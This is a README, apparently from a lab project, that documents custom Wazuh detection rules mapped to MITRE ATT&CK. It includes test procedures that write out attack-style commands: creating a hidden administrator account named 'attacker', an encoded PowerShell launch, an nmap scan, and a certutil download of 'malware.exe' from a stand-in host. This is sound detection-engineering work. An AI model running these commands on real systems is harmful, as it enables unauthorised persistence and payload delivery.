# Custom Detection Rules

## Overview

This project includes custom Wazuh detection rules developed to identify common attack techniques observed in enterprise environments.

The rules extend Wazuh's default capabilities by detecting suspicious authentication activity, PowerShell abuse, reconnaissance, and malicious Windows utilities.

Each rule is mapped to the MITRE ATT&CK framework to improve threat classification and incident investigation.

---

# Detection Summary

| Rule ID | Detection | Severity | MITRE ATT&CK |
|----------|-----------|----------|--------------|
| 100100 | Multiple Windows Failed Logins | High | T1110 |
| 100101 | Encoded PowerShell Execution | Critical | T1059.001 |
| 100102 | New Administrator Account | Critical | T1136 |
| 100103 | Network Port Scan | High | T1046 |
| 100104 | Certutil Execution | Critical | T1105 |
| 100105 | Bitsadmin Execution | High | T1197 |
| 100106 | Rundll32 Execution | Critical | T1218.011 |

---

# Rule 100100

## Name

Multiple Windows Failed Logins

### Purpose

Detects repeated Windows authentication failures that may indicate a brute-force attack.

### Detection Logic

- Windows Event ID 4625
- Five or more failed logins within 60 seconds

### MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1110 | Brute Force |

### Test Procedure

Attempt multiple incorrect logins on Windows Server 2022.

Expected Result:

- High Severity Alert
- Rule ID 100100

---

# Rule 100101

## Name

Encoded PowerShell Execution

### Purpose

Detects PowerShell launched with the `-EncodedCommand` parameter.

### Detection Logic

Monitors Sysmon Process Creation events for PowerShell encoded commands.

### MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1059.001 | PowerShell |

### Test Procedure

Run:

```powershell
powershell.exe -EncodedCommand SQBlAGMAbwAgAHQAZQBzAHQA
```

Expected Result:

- Critical Alert
- Rule ID 100101

---

# Rule 100102

## Name

New Administrator Account

### Purpose

Detects creation of a privileged local administrator account.

### Detection Logic

Monitors Windows account management events.

### MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1136 | Create Account |

### Test Procedure

```cmd
net user attacker P@ssw0rd123! /add

net localgroup Administrators attacker /add
```

Expected Result

- Critical Alert
- Rule ID 100102

---

# Rule 100103

## Name

Network Port Scan

### Purpose

Detects reconnaissance activity performed using port scanning tools.

### Detection Logic

Monitors Sysmon network connection events generated during scanning.

### MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1046 | Network Service Discovery |

### Test Procedure

From Kali Linux:

```bash
nmap -A <Windows-IP>
```

Expected Result

- High Severity Alert
- Rule ID 100103

---

# Rule 100104

## Name

Certutil Execution

### Purpose

Detects execution of Certutil, which attackers commonly use to download or decode payloads.

### MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1105 | Ingress Tool Transfer |

### Test Procedure

```cmd
certutil.exe -urlcache -split -f http://example.com/file.exe malware.exe
```

Expected Result

- Critical Alert
- Rule ID 100104

---

# Rule 100105

## Name

Bitsadmin Execution

### Purpose

Detects execution of Bitsadmin, a utility that can be abused for stealthy file transfers.

### MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1197 | BITS Jobs |

### Test Procedure

```cmd
bitsadmin.exe
```

Expected Result

- High Severity Alert
- Rule ID 100105

---

# Rule 100106

## Name

Rundll32 Execution

### Purpose

Detects execution of Rundll32, which is frequently abused to execute malicious code.

### MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1218.011 | Rundll32 |

### Test Procedure

```cmd
rundll32.exe shell32.dll,Control_RunDLL
```

Expected Result

- Critical Alert
- Rule ID 100106

---

# Validation

All custom rules were validated within the lab environment using controlled attack simulations from Kali Linux and Windows Server 2022.

Validation included:

- Rule loading verification
- Alert generation
- Dashboard visualization
- MITRE ATT&CK mapping
- Incident investigation

---

# Future Improvements

Planned enhancements include:

- Sigma rule integration
- Threat Intelligence enrichment
- YARA-based detections
- Custom decoders
- Automated rule testing
- CI/CD validation pipeline

---

# Conclusion

These custom detection rules demonstrate practical detection engineering skills by extending Wazuh with tailored logic for common enterprise attack techniques. They improve visibility into suspicious activity and support faster threat detection and incident response.
